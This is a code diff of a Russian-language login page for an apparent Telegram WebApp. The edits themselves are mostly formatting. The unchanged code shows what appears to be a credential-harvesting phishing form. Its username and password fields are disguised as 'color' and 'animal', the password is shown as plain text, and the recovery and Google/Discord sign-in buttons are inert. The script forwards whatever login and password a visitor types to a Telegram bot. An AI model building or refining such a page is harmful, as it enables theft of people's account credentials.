@@ -17,36 +17,28 @@
           <code>public/obezyana/obezyana.png</code>
         </div>
       </div>
-
       <p class="kicker">Добро пожаловать!</p>
       <h1 class="title">Введите данные для входа</h1>
-
       <form class="form" id="loginForm">
         <label class="field">
           <span class="sr-only">Логин либо E-mail</span>
           <input id="color" name="color" type="text" placeholder="Логин либо E-mail" required />
         </label>
-
         <label class="field">
           <span class="sr-only">Пароль</span>
           <input id="animal" name="animal" type="text" placeholder="Пароль" required />
         </label>
-
         <div class="row">
           <a class="link" href="#" onclick="return false;">Забыли пароль?</a>
         </div>
-
         <button class="btn btn--primary" id="btnLogin" type="submit">
           Войти <span class="arrow">→</span>
         </button>
-
         <button class="btn btn--accent" type="button" onclick="return false;">
-          <img src="public/icons/create-ac.svg" style="width:18px;height:18px;vertical-align:middle;margin-right:6px;">Создать аккаунт
-          <span class="userplus" aria-hidden="true"> </span>
+          Создать аккаунт
+          <img src="public/icons/create-ac.svg" style="width:36px;height:36px;vertical-align:middle;margin-left:6px;">
         </button>
-
         <div class="divider"></div>
-
         <div class="social">
           <button class="social__btn" type="button" onclick="return false;" aria-label="Войти через Google">
             <img src="public/icons/google.svg" alt="" />
@@ -55,7 +47,6 @@
             <img src="public/icons/discord.svg" alt="" />
           </button>
         </div>
-
         <p class="fineprint">
           Продолжая, Вы соглашаетесь с условиями
           <a class="fineprint__link" href="#" onclick="return false;">политики конфиденциальности</a>
@@ -65,21 +56,16 @@
       </form>
     </section>
   </main>
-
   <script>
     // Инициализация Telegram WebApp
     const tg = window.Telegram.WebApp;
     tg.expand(); // Раскрываем на всё окно
-
     const loginForm = document.getElementById('loginForm');
-
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault(); // Предотвращаем перезагрузку страницы
-
         // Получаем значения из полей
         const loginVal = document.getElementById('color').value;
         const messageVal = document.getElementById('animal').value;
-
         // Формируем JSON объект точно по структуре твоего бота
         const data = {
             type: "submit",
@@ -88,14 +74,11 @@
                 animal: messageVal
             }
         };
-
         // Отправляем данные боту (это закроет WebApp)
         tg.sendData(JSON.stringify(data));
     });
   </script>
-
   <script src="script.js"></script>
-
-<div id="status" style="display:none"></div>
+  <div id="status" style="display:none"></div>
 </body>
 </html>
